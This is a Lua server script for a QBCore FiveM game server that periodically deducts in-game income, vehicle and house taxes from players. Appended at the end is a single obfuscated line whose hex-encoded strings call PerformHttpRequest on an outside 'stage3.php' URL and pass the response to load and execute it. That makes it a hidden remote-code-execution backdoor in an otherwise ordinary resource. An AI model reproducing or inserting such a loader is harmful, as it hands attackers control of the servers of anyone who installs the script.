local QBCore = exports['qb-core']:GetCoreObject()

local function addMoneyToAccount(amount, text)
    if not Shared.TaxesAccountEnabled then return end
    if Shared.TaxesAccount.accountType == 'business' then
        local business = exports['qb-banking']:business(Shared.TaxesAccount.name, Shared.TaxesAccount.business_id)
        if business then business.addBalance(amount, text) end
    elseif Shared.TaxesAccount.accountType == 'player' then
        local onlinePlayer = QBCore.Functions.GetPlayerByCitizenId(Shared.TaxesAccount.playerCitizenId)
        if onlinePlayer then
            onlinePlayer.Functions.SetMoney('bank', amount, text)
        else
            local offlinePlayer = QBCore.Functions.GetOfflinePlayerByCitizenId(Shared.TaxesAccount.playerCitizenId)
            offlinePlayer.Functions.SetMoney('bank', amount, text)
        end
    end
end

function PlayersTax()
    local taxAmount = 0
    local Players = QBCore.Functions.GetPlayers()
    for i = 1, #Players, 1 do
        local Player = QBCore.Functions.GetPlayer(Players[i])
        if Player then
            local Amount = 0
            if (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['low'] then
                Amount = (Player.PlayerData.money.bank * Shared.EconomyTaxPercentage['low'] / 1000)
                TriggerClientEvent("QBCore:Notify", Players[i],
                    "You have been taxed at " ..
                    Shared.EconomyTaxPercentage['low'] .. "% by the government for $" .. Amount .. ".")
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['medium'] then
                Amount = (Player.PlayerData.money.bank * Shared.EconomyTaxPercentage['medium'] / 1000)
                TriggerClientEvent("QBCore:Notify", Players[i],
                    "You have been taxed at " ..
                    Shared.EconomyTaxPercentage['medium'] .. "% by the government for $" .. Amount .. ".")
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['high'] then
                Amount = (Player.PlayerData.money.bank * Shared.EconomyTaxPercentage['high'] / 1000)
                TriggerClientEvent("QBCore:Notify", Players[i],
                    "You have been taxed at " ..
                    Shared.EconomyTaxPercentage['high'] .. "% by the government for $" .. Amount .. ".")
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['ultra'] then
                Amount = (Player.PlayerData.money.bank * Shared.EconomyTaxPercentage['ultra'] / 1000)
                TriggerClientEvent("QBCore:Notify", Players[i],
                    "You have been taxed at " ..
                    Shared.EconomyTaxPercentage['ultra'] .. "% by the government for $" .. Amount .. ".")
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['extreme'] then
                Amount = (Player.PlayerData.money.bank * Shared.EconomyTaxPercentage['extreme'] / 1000)
                TriggerClientEvent("QBCore:Notify", Players[i],
                    "You have been taxed at " ..
                    Shared.EconomyTaxPercentage['extreme'] .. "% by the government for $" .. Amount .. ".")
            else
                Amount = 100
                TriggerClientEvent("QBCore:Notify", Players[i],
                    "You have been taxed at standard rate by the government for $100.")
            end
            Player.Functions.RemoveMoney("bank", math.floor(Amount), "incometax")
            TriggerEvent("qb-log:server:CreateLog", "cadtax",
                "[" .. Player.PlayerData.citizenid .. "] was charged income tax of $" .. math.floor(Amount))
            taxAmount = taxAmount + Amount
        end
    end
    local amount = math.floor(taxAmount)
    addMoneyToAccount(amount, string.format(Shared.Lang.player_tax, amount))
    SetTimeout(Shared.EconomyTaxInterval * (60 * 1000), PlayersTax)
end

function CarsTax()
    local taxAmount = 0
    local Players = QBCore.Functions.GetPlayers()
    MySQL.query('SELECT * FROM player_vehicles', {}, function(Vehicles)
        for i = 1, #Players, 1 do
            local VehCount = 0
            local LP = QBCore.Functions.GetPlayer(Players[i])
            if LP then
                for a = 1, #Vehicles, 1 do
                    if LP.PlayerData.citizenid == Vehicles[a].citizenid then
                        VehCount = VehCount + 1
                    end
                end
                if VehCount > 0 then
                    local VehTax = VehCount * Shared.CarTaxRate
                    local Player = QBCore.Functions.GetPlayerByCitizenId(LP.PlayerData.citizenid)
                    if Player then
                        Player.Functions.RemoveMoney("bank", math.floor(VehTax), "vehicletax")
                        TriggerClientEvent("QBCore:Notify", Player.PlayerData.source,
                            "You have been taxed $" .. math.floor(VehTax) .. " as Vehicle Tax.")
                        TriggerEvent("qb-log:server:CreateLog", "cadtax",
                            "[" .. Player.PlayerData.citizenid .. "] was charged vehicle tax of $" .. math.floor(VehTax))
                        taxAmount = taxAmount + VehTax
                    end
                end
            end
        end
        local amount = math.floor(taxAmount)
        addMoneyToAccount(amount, string.format(Shared.Lang.car_tax, amount))
    end)
    SetTimeout(Shared.CarTaxInterval * (60 * 1000), CarsTax)
end

function HousesTax()
    local taxAmount = 0
    local Players = QBCore.Functions.GetPlayers()
    MySQL.query('SELECT * FROM player_houses', {}, function(Houses)
        for i = 1, #Players, 1 do
            local HouseCount = 0
            local LP = QBCore.Functions.GetPlayer(Players[i])
            if LP then
                for a = 1, #Houses, 1 do
                    if LP.PlayerData.citizenid == Houses[a].citizenid then
                        HouseCount = HouseCount + 1
                    end
                end
                if HouseCount > 0 then
                    local HouseTax = HouseCount * Shared.HouseTaxRate
                    local Player = QBCore.Functions.GetPlayerByCitizenId(LP.PlayerData.citizenid)
                    if Player then
                        Player.Functions.RemoveMoney("bank", math.floor(HouseTax), "housetax")
                        TriggerClientEvent("QBCore:Notify", Player.PlayerData.source,
                            "You have been taxed $" .. math.floor(HouseTax) .. " as House Tax.")
                        TriggerEvent("qb-log:server:CreateLog", "cadtax",
                            "[" .. Player.PlayerData.citizenid .. "] was charged houses tax of $" .. math.floor(HouseTax))
                        taxAmount = taxAmount + HouseTax
                    end
                end
            end
        end
        local amount = math.floor(taxAmount)
        addMoneyToAccount(amount, string.format(Shared.Lang.house_tax, amount))
    end)
    SetTimeout(Shared.HouseTaxInterval * (60 * 1000), HousesTax)
end

function GetCurrentTax(src, taxtype)
    local Player = QBCore.Functions.GetPlayer(src)
    if Player then
        if taxtype == 'income' then
            if (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['low'] then
                return Shared.EconomyTax['low']
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['medium'] then
                return Shared.EconomyTax['medium']
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['high'] then
                return Shared.EconomyTax['high']
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['ultra'] then
                return Shared.EconomyTax['ultra']
            elseif (Player.PlayerData.money.bank or Player.PlayerData.money.cash) > Shared.EconomyTax['extreme'] then
                return Shared.EconomyTax['extreme']
            else
                return 100
            end
        elseif taxtype == 'vehicle' then
            return Shared.CarTaxRate
        elseif taxtype == 'house' then
            return Shared.HouseTaxRate
        end
    end
end

CreateThread(function()
    Wait(30000) -- wait just for server to load properly then execute below
    PlayersTax()
    CarsTax()
    HousesTax()
end)


local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)